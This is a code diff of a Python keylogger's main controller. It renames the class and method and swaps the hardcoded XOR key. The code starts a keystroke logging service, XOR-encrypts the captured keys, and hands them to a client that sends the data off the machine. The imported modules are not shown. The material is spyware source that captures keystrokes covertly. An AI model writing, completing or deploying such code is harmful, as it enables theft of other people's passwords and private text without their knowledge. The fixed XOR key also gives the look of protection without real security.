@@ -1,11 +1,11 @@
 from EncryptedXor import EncryptedXor
 from KeyLoggerService import KeyLoggerService
-from clientSide import SendData
+from ClientSide import SendData
 from datetime import datetime
 import time
 
 
-class KeyLoggerMenger:
+class KeyLoggerManager:
       def __init__(self):
           self.start=KeyLoggerService()
           self.send_client=SendData()
@@ -13,8 +13,8 @@ class KeyLoggerMenger:
           self.xor = EncryptedXor()
 
 
-      def start_to_programe(self):
-          key="abc"
+      def start_to_program(self):
+          key="israelvitzman"
           self.start.start_logging()
 
           while True:
@@ -32,8 +32,8 @@ class KeyLoggerMenger:
                self.start.data.clear()
 
 
-s=KeyLoggerMenger()
-s.start_to_programe()
+s=KeyLoggerManager()
+s.start_to_program()
 
 
 
